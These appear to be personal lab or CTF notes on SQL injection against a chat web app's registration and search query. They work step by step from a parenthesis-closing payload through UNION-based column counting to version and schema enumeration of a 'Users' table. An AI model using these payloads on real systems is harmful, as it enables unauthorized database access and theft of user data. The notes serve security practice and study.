- SQL Injection Register payload:
	- `username=anshul2&password=Hello123@&repeatPassword=Hello123@&invitationCode=abcd-efgh-1234'--+`

- Again in search query:
	- `GET /index.php?q=hello'+OR+'1'='1')-- &u=1 HTTP/1.1`
	- **==Key detail here is the closing parenthesis==**

- Identifying no. of columns:
	- `GET /index.php?q=hello'+OR+'1'='1')+UNION+SELECT+NULL,NULL,NULL,NULL--+&u=1 `
	- 4 columns found

- Getting version:
	- `/index.php?q=hello'+OR+'1'='1')+UNION+SELECT+NULL,NULL,NULL,version()--+&u=1`
	- ![[Pasted image 20251025060919.png]]
- Getting more information:
	- database() => `chattr`
		- Tables: `UNION+SELECT+NULL,NULL,TABLE_NAME,TABLE_SCHEMA+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA%3d'chattr'`
	- Coumns:
		- `index.php?q=hello'+OR+'1'='1')+UNION+SELECT+NULL,NULL,COLUMN_NAME,TABLE_NAME+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME%3d'Users'--+`
	- 